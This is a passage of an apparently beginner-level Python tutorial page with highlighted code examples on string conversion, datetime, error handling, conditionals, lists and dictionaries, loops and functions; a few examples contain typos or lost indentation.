class="hljs-comment"># When displaying a string that contains numbers you must convert the numbers into strings</span><br>days_in_feb = <span class="hljs-number">28</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(days_in_feb) + <span class="hljs-string">&#x27;days in February&#x27;</span>)<br><br><span class="hljs-comment"># Numbers can be stored as strings</span><br><span class="hljs-comment"># Numbers stored as strings are treated as strings</span><br>first_number = <span class="hljs-string">&#x27;5&#x27;</span><br>second_name = <span class="hljs-string">&#x27;6&#x27;</span><br><span class="hljs-built_in">print</span>(first_number + second_name)<br><br><span class="hljs-comment"># The input function always returns strings</span><br><span class="hljs-comment"># Numbers stored as strings must be converted to numeric values before doing math</span><br>first_number = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Enter your first number:&#x27;</span>)<br>second_name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Enter your second number:&#x27;</span>)<br><span class="hljs-built_in">print</span>(first_number + second_name)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(first_number) + <span class="hljs-built_in">int</span>(second_name))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">float</span>(first_number) + <span class="hljs-built_in">float</span>(second_name))<br><br></code></pre></td></tr></table></figure><h3 id="5ã€Dates"><a href="#5ã€Dates" class="headerlink" title="5ã€Dates"></a>5ã€Dates</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># To get current date and time, we need to use the datetime library</span><br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime,timedelta<br><br><span class="hljs-comment"># The now function returns a datetime object</span><br>current_date = datetime.now()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Today is: &#x27;</span> + <span class="hljs-built_in">str</span>(current_date))<br><br><span class="hljs-comment"># Use date functions to control date formatting</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Day: &#x27;</span> + <span class="hljs-built_in">str</span>(current_date.day))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Month: &#x27;</span> + <span class="hljs-built_in">str</span>(current_date.month))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Year: &#x27;</span> + <span class="hljs-built_in">str</span>(current_date.year))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hour: &#x27;</span> + <span class="hljs-built_in">str</span>(current_date.hour))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Minute: &#x27;</span> + <span class="hljs-built_in">str</span>(current_date.minute))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Second: &#x27;</span> + <span class="hljs-built_in">str</span>(current_date.second))<br><br><span class="hljs-comment"># timedelta is used to define a period of time</span><br><span class="hljs-comment"># you can use timedelta to add or remove days, or weeks to a date</span><br>one_day = timedelta(days=<span class="hljs-number">1</span>)<br>today = datetime.now()<br>yesterday = today - one_day<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Yesterday was: &#x27;</span> + <span class="hljs-built_in">str</span>(yesterday))<br><br><span class="hljs-comment"># Sometimes you receive the date as a string and need to convert it to a datetime object</span><br><span class="hljs-comment"># Make sure you add exception handling in case  the date entered is invalid</span><br>birthday = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;when is your birthday(dd/mm/yyyy)? &#x27;</span>)<br>birthday_date = datetime.strptime(birthday, <span class="hljs-string">&#x27;%d%m%Y&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Brithday: &#x27;</span> + <span class="hljs-built_in">str</span>(brithday_date))<br><br><span class="hljs-comment"># Converting it to a datetime allows you to use the date functions</span><br>one_day = timedelta(days=<span class="hljs-number">1</span>)<br>birthday_eve = birthday_date - one_day<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Day before birthday: &#x27;</span> + <span class="hljs-built_in">str</span>(birthday_eve))<br><br></code></pre></td></tr></table></figure><h3 id="6ã€Error-handling"><a href="#6ã€Error-handling" class="headerlink" title="6ã€Error handling"></a>6ã€Error handling</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Error handling, Debugging</span><br><span class="hljs-comment"># Error types: Syntax error, Runtime error, Logic error</span><br><br><span class="hljs-comment"># Syntax error</span><br>x = <span class="hljs-number">2</span><br>y = <span class="hljs-number">3</span><br><span class="hljs-keyword">if</span> x==y<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello&#x27;</span>)<br><br><span class="hljs-comment"># Runtime error</span><br>x = <span class="hljs-number">2</span><br>y = <span class="hljs-number">0</span><br><span class="hljs-built_in">print</span>(x/y)<br><br><span class="hljs-comment"># Catching runtime errors</span><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">print</span>(x/y)<br><span class="hljs-keyword">except</span> ZeroDivisionError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-comment"># Optionally, log e somewhere</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Sorry, something went wrong&#x27;</span>)<br><span class="hljs-keyword">except</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Something really went wrong&#x27;</span>)<br><span class="hljs-keyword">finally</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;This always runs on success or failure&#x27;</span>)<br><br><span class="hljs-comment"># Logic error</span><br>x = <span class="hljs-number">2</span><br>y = <span class="hljs-number">3</span><br><span class="hljs-keyword">if</span> x &lt; y:<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(x) + <span class="hljs-string">&#x27; is greater than &#x27;</span> + <span class="hljs-built_in">str</span>(y))<br><br></code></pre></td></tr></table></figure><p><strong>When to use try/except/finally?</strong></p><ul><li><p><strong>When something might go wrong</strong></p><ul><li>User input</li><li>Accessing an external system<ul><li>REST call</li><li>File system</li></ul></li></ul></li><li><p><strong>You can act upon the error</strong></p><ul><li>Logging</li><li>Graceful exit</li></ul></li></ul><p><strong>Some final words on try/except/finally</strong></p><ul><li><p><strong>Not used to find bugs</strong></p><ul><li>Debugging, not error handling</li></ul></li><li><p><strong>You donâ€™t have to catch all errors</strong></p><ul><li>Let it bubble up</li><li>Someone else will deal with it</li><li>The application will crash<ul><li>Sometimes, this is exactly what you want to happen</li></ul></li></ul></li></ul><p><strong>Figuring out what went wrong</strong></p><ul><li><p>Stack trace</p><ul><li>Last calls are on the top</li><li>Your code is likely on the bottom</li><li>Seek out line numbers</li></ul></li><li><p>Finding your mistake</p><ul><li>Reread your code</li><li>Check the documentation</li><li>Search the internet</li><li>Take a break</li><li>Ask someone for help</li></ul></li></ul><h3 id="7ã€Handling-conditions"><a href="#7ã€Handling-conditions" class="headerlink" title="7ã€Handling conditions"></a>7ã€Handling conditions</h3><h4 id="1ï¼‰Handling-conditions"><a href="#1ï¼‰Handling-conditions" class="headerlink" title="1ï¼‰Handling conditions"></a>1ï¼‰Handling conditions</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Your code needs the ability to take different actions based on different conditions</span><br><span class="hljs-keyword">if</span> price &gt;= <span class="hljs-number">1.00</span>:<br>    tax = <span class="hljs-number">.07</span><br>    <span class="hljs-built_in">print</span>(tax)<br><br><span class="hljs-comment"># You can add a default action using else</span><br><span class="hljs-keyword">if</span> price &gt;= <span class="hljs-number">1.00</span>:<br>    tax = <span class="hljs-number">.07</span><br>    <span class="hljs-built_in">print</span>(tax)<br><span class="hljs-keyword">else</span>:<br>    tax = <span class="hljs-number">0</span><br>    <span class="hljs-built_in">print</span>(tax)<br><br><span class="hljs-comment"># How you indent your code changes execution</span><br><span class="hljs-keyword">if</span> price &gt;= <span class="hljs-number">1.00</span>:<br>    tax = <span class="hljs-number">.07</span><br><span class="hljs-keyword">else</span>:<br>    tax = <span class="hljs-number">0</span><br><span class="hljs-built_in">print</span>(tax)<br><br><span class="hljs-comment"># Be careful when comparing strings: string case sensitive</span><br><span class="hljs-comment"># Use string functions to make case insensitive comparisons</span><br>country = <span class="hljs-string">&#x27;CANADA&#x27;</span><br><span class="hljs-keyword">if</span> country.lower() == <span class="hljs-string">&#x27;canada&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Oh look a Canadian&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;You are not from Canada&#x27;</span>)<br><br></code></pre></td></tr></table></figure><h4 id="2ï¼‰Handling-multiple-conditions"><a href="#2ï¼‰Handling-multiple-conditions" class="headerlink" title="2ï¼‰Handling multiple conditions"></a>2ï¼‰Handling multiple conditions</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># You may need to check multiple conditions to determine the correct action</span><br><span class="hljs-keyword">if</span> province == <span class="hljs-string">&#x27;Alberta&#x27;</span>:<br>    tax = <span class="hljs-number">0.05</span><br><span class="hljs-keyword">if</span> province == <span class="hljs-string">&#x27;Ontario&#x27;</span>:<br>    tax = <span class="hljs-number">0.13</span><br><br><span class="hljs-comment"># If only one of the conditions will ever occur you can use a single if statement with elif</span><br><span class="hljs-keyword">if</span> province == <span class="hljs-string">&#x27;Alberta&#x27;</span>:<br>    tax = <span class="hljs-number">0.05</span><br><span class="hljs-keyword">elif</span> province == <span class="hljs-string">&#x27;Ontario&#x27;</span>:<br>    tax = <span class="hljs-number">0.13</span><br><br><span class="hljs-comment"># When you use elif instead of multiple if statements you can add a default action</span><br><span class="hljs-keyword">if</span> province == <span class="hljs-string">&#x27;Alberta&#x27;</span>:<br>    tax = <span class="hljs-number">0.05</span><br><span class="hljs-keyword">elif</span> province == <span class="hljs-string">&#x27;Ontario&#x27;</span>:<br>    tax = <span class="hljs-number">0.13</span><br><span class="hljs-keyword">else</span>:<br>    tax = <span class="hljs-number">0.15</span><br><br><span class="hljs-comment"># If multiple conditions cause the same action they can be combined into a single condition</span><br><span class="hljs-keyword">if</span> province == <span class="hljs-string">&#x27;Alberta&#x27;</span> <span class="hljs-keyword">or</span> province == <span class="hljs-string">&#x27;Nunavut&#x27;</span>:<br>    tax = <span class="hljs-number">0.05</span><br><br><span class="hljs-comment"># If you have a list of possible values to check , you can use the IN operator </span><br><span class="hljs-keyword">if</span> province <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;Alberta&#x27;</span>,<span class="hljs-string">&#x27;Nunavut&#x27;</span>):<br>    tax = <span class="hljs-number">0.05</span><br><br></code></pre></td></tr></table></figure><h4 id="3ï¼‰Complex-condition-checks"><a href="#3ï¼‰Complex-condition-checks" class="headerlink" title="3ï¼‰Complex condition checks"></a>3ï¼‰Complex condition checks</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># If an action depends on a combination of conditions you can nest if statements</span><br><span class="hljs-keyword">if</span> country == <span class="hljs-string">&#x27;Canada&#x27;</span>:<br><span class="hljs-keyword">if</span> province <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;Alberta&#x27;</span>,<span class="hljs-string">&#x27;Nunavut&#x27;</span>):<br>    tax = <span class="hljs-number">0.05</span><br><span class="hljs-keyword">else</span>:<br>    tax = <span class="hljs-number">0.15</span><br><span class="hljs-keyword">else</span>:<br>    tax = <span class="hljs-number">0.0</span><br><br><span class="hljs-comment"># Sometimes you can combine conditions with AND instead of nesting if statements    </span><br><span class="hljs-comment"># combine conditions with and instead of nesting if statements</span><br><span class="hljs-keyword">if</span> gpa &gt; <span class="hljs-number">.85</span>:<br><span class="hljs-keyword">if</span> lowest_grade &gt; <span class="hljs-number">.70</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Well done&#x27;</span>)<br><br><span class="hljs-keyword">if</span> gpa &gt; <span class="hljs-number">.85</span> <span class="hljs-keyword">and</span> lowest_grade &gt; <span class="hljs-number">.70</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Well done&#x27;</span>)<br><br><span class="hljs-comment"># If you need to remember the results of a condition check later in your code, use Boolean variables as flags</span><br><span class="hljs-comment"># use Boolean variables as flags</span><br><span class="hljs-keyword">if</span> gpa &gt; <span class="hljs-number">.85</span> <span class="hljs-keyword">and</span> lowest_grade &gt; <span class="hljs-number">.70</span>:<br>    honour_roll = <span class="hljs-literal">True</span><br><span class="hljs-keyword">else</span>:<br>    honour_roll = <span class="hljs-literal">False</span><br><span class="hljs-keyword">if</span> honour_roll:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Well done&#x27;</span>)<br>    <br><span class="hljs-comment"># Combining operators allows you to handle complex business rules in your code but must be tested very carefully to avoid introducing errors</span><br><br></code></pre></td></tr></table></figure><h3 id="8ã€Collections"><a href="#8ã€Collections" class="headerlink" title="8ã€Collections"></a>8ã€Collections</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Collections: Lists, Arrays, Dictionaries</span><br><br><span class="hljs-comment"># Lists(Lists are collections of items)</span><br>name = [<span class="hljs-string">&#x27;Chris&#x27;</span>, <span class="hljs-string">&#x27;Susan&#x27;</span>]<br><span class="hljs-built_in">print</span>(name)<br><br>scores = []<br>scores.append(<span class="hljs-number">98</span>)<br>scores.append(<span class="hljs-number">99</span>)<br><span class="hljs-built_in">print</span>(scores)<br><span class="hljs-built_in">print</span>(scores[<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># Arrays(Arrays are also collections of items)</span><br><span class="hljs-keyword">from</span> array <span class="hljs-keyword">import</span> array<br>scores = array(<span class="hljs-string">&#x27;d&#x27;</span>)<br>scores.append(<span class="hljs-number">98</span>)<br>scores.append(<span class="hljs-number">99</span>)<br><span class="hljs-built_in">print</span>(scores)<br><span class="hljs-built_in">print</span>(scores[<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># Commom operations</span><br>names = [<span class="hljs-string">&#x27;Susan&#x27;</span>, <span class="hljs-string">&#x27;Chris&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(names))         <span class="hljs-comment"># Get the number of items</span><br>names.insert(<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;Bill&#x27;</span>)   <span class="hljs-comment"># Insert before index</span><br><span class="hljs-built_in">print</span>(names)<br>names.sort()<br><span class="hljs-built_in">print</span>(names)<br><br><span class="hljs-comment"># Retrieving ranges</span><br>names = [<span class="hljs-string">&#x27;Susan&#x27;</span>, <span class="hljs-string">&#x27;Chris&#x27;</span>, <span class="hljs-string">&#x27;Bill&#x27;</span>]<br>presenters = names[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]<br><span class="hljs-built_in">print</span>(names)<br><span class="hljs-built_in">print</span>(presenters)<br><br><span class="hljs-comment"># Dictionaries</span><br>person = &#123;<span class="hljs-string">&#x27;first&#x27;</span>: <span class="hljs-string">&#x27;Susan&#x27;</span>&#125;<br>person[<span class="hljs-string">&#x27;last&#x27;</span>] = <span class="hljs-string">&#x27;Chris&#x27;</span><br><span class="hljs-built_in">print</span>(person)<br><span class="hljs-built_in">print</span>(person[<span class="hljs-string">&#x27;first&#x27;</span>])<br><br></code></pre></td></tr></table></figure><p><strong>Whatâ€™s the difference?</strong></p><ul><li><p><strong>Arrays</strong></p><ul><li><p>Simple types such as numbers</p></li><li><p>Must all be the same type</p></li></ul></li><li><p><strong>Lists</strong></p><ul><li><p>Store anything</p></li><li><p>Store any type</p></li></ul></li><li><p><strong>Dictionaries</strong></p><ul><li><p>Key/Value pairs</p></li><li><p>Storage order not guaranteed</p></li></ul></li></ul><h3 id="9ã€Loops"><a href="#9ã€Loops" class="headerlink" title="9ã€Loops"></a>9ã€Loops</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Loops: for, while</span><br><br><span class="hljs-comment"># Loop through a collection</span><br><span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;Susan&#x27;</span>, <span class="hljs-string">&#x27;Chris&#x27;</span>, <span class="hljs-string">&#x27;Bill&#x27;</span>]:<br>    <span class="hljs-built_in">print</span>(name)<br><br><span class="hljs-comment"># Looping a number of times</span><br><span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>):<br>    <span class="hljs-built_in">print</span>(index)<br><br><span class="hljs-comment"># Looping with a condition</span><br>names = [<span class="hljs-string">&#x27;Susan&#x27;</span>, <span class="hljs-string">&#x27;Chris&#x27;</span>, <span class="hljs-string">&#x27;Bill&#x27;</span>]<br>index = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> index &lt; <span class="hljs-built_in">len</span>(names):<br>    <span class="hljs-built_in">print</span>(names[index])<br>    index = index + <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><h3 id="10ã€Functions"><a href="#10ã€Functions" class="headerlink" title="10ã€Functions"></a>10ã€Functions</h3><ul><li><p>Functions make your code more readable and easier to maintain</p><ul><li>reuse and readability(å¤ç”¨æ€§å’Œå¯è¯»æ€§)</li></ul></li><li><p>Always add comments to explain the purpose of your functions</p><ul><li>name notation(åå­—å‘½åæ³•)</li></ul></li><li><p>Functions must be declared before the line of code where the function is called</p></li></ul><h4 id="1ï¼‰Function1"><a href="#1ï¼‰Function1" class="headerlink" title="1ï¼‰Function1"></a>1ï¼‰Function1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Sometimes we copy and paste our code</span><br><span class="hljs-keyword">import</span> datetime<br>    <br>first_name = <span class="hljs-string">&#x27;Susan&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;task completed&#x27;</span>)<br><span class="hljs-built_in">print</span>(datetime.datetime.now())<br><span class="hljs-built_in">print</span>()<br><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>):<br>    <span class="hljs-built_in">print</span>(x)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;task completed&#x27;</span>)<br><span class="hljs-built_in">print</span>(datetime.datetime.now())<br><span class="hljs-built_in">print</span>()<br><br><br><span class="hljs-comment"># Use functions instead of repeating code</span><br><span class="hljs-keyword">import</span> datetime<br><br><span class="hljs-comment"># Print the current time</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">print_time</span>():</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;task completed&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(datetime.datetime.now())<br>    <span class="hljs-built_in">print</span>()<br>    <br>first_name = <span class="hljs-string">&#x27;Susan&#x27;</span><br>print_time()<br><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>):<br>    <span class="hljs-built_in">print</span>(x)<br>print_time()<br><br><span class="hljs-comment"># By moving the code to a function, you reduce rework and the chance of introducing bugs when you change the code you had copied</span><br><br><span class="hljs-comment"># Import the datetime class from datetime library</span><br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><span class="hljs-comment"># Now I don&#x27;t need the extra datetime prefix</span><br><span class="hljs-built_in">print</span>(datetime.now())<br><br></code></pre></td></tr></table></figure><h4 id="2ï¼‰Function2"><a href="#2ï¼‰Function2" class="headerlink" title="2ï¼‰Function2"></a>2ï¼‰Function2</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># What if I want a different message displayed?</span><br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br>    <br>first_name = <span class="hljs-string">&#x27;Susan&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;first name assigned&#x27;</span>)<br><span class="hljs-built_in">print</span>(datetime.now())<br><span class="hljs-built_in">print</span>()<br><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>):<br>    <span class="hljs-built_in">print</span>(x)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;loop completed&#x27;</span>)<br><span class="hljs-built_in">print</span>(datetime.now())<br><span class="hljs-built_in">print</span>()<br><br><br><span class="hljs-comment"># Pass the task name as a parameter </span><br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><br><span class="hljs-comment"># Print the current time</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">print_time</span>(<span class="hljs-params">task_name</span>):</span><br>    <span class="hljs-built_in">print</span>(task_name)<br>    <span class="hljs-built_in">print</span>(datetime.now())<br>    <span class="hljs-built_in">print</span>()<br>    <br>first_name = <span class="hljs-string">&#x27;Susan&#x27;</span><br>print_time(<span class="hljs-string">&#x27;first name assigned&#x27;</span>)<br><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>):<br>    <span class="hljs-built_in">print</span>(x)<br>print_time(<span class="hljs-string">&#x27;loop completed&#x27;</span>)<br><br></code></pre></td></tr></table></figure><h4 id="3ï¼‰Function3"><a href="#3ï¼‰Function3" class="headerlink" title="3ï¼‰Function3"></a>3ï¼‰Function3</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Here&#x27;s another example where the code looks different but we are doing the same logic over and over</span><br>first_name = <span class="hljs-string">&#x27;susan&#x27;</span><br>first_name_initial = first_name[<span class="hljs-number">0</span>:<span class="hljs-number">1</span>]<br><br>last_name = <span class="hljs-string">&#x27;ibach&#x27;</span><br>last_name_initial = last_name[<span class="hljs-number">0</span>:<span class="hljs-number">1</span>]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Your initials are: &#x27;</span> + first_name_initial + last_name_initial)<br><br><br><span class="hljs-comment"># I can still use a function, but this time my function returns a value</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_initial</span>(<span class="hljs-params">name</span>):</span><br>    initial = name[<span class="hljs-number">0</span>:<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> initial<br><br>first_name = <span class="hljs-string">&#x27;susan&#x27;</span><br>first_name_initial = get_initial(first_name)<br><br>last_name = <span class="hljs-string">&#x27;ibach&#x27;</span><br>last_name_initial = get_initial(last_name)<br><br><span 